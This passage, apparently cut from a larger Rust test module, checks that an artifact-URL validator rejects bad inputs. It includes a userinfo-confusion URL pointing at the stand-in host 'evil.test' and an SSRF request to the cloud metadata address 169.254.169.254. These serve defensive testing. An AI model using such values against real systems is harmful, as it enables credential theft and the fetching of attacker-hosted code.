        assert!(artifact_url_ok("http://127.0.0.1:8080/a.tgz", true));
        assert!(!artifact_url_ok("ftp://example.com/a.tgz", true));
        assert!(!artifact_url_ok("https://user:pw@example.com/a.tgz", false));
        assert!(!artifact_url_ok("https://example.com@evil.test/a.tgz", false));
        assert!(!artifact_url_ok("https:///a.tgz", false));
        assert!(!artifact_url_ok("https://exa mple.com/a.tgz", false));
        let http = Fake::default();
        let mut i = pinput(&"a".repeat(64));
        i.artifact_url = "http://169.254.169.254/latest".into();
        let out = run_publish(&i, &secrets(), REG, &http, &fast());
        assert_eq!(out.error.as_deref(), Some("bad_input"));
        assert!(http.calls.borrow().is_empty());
    }
}
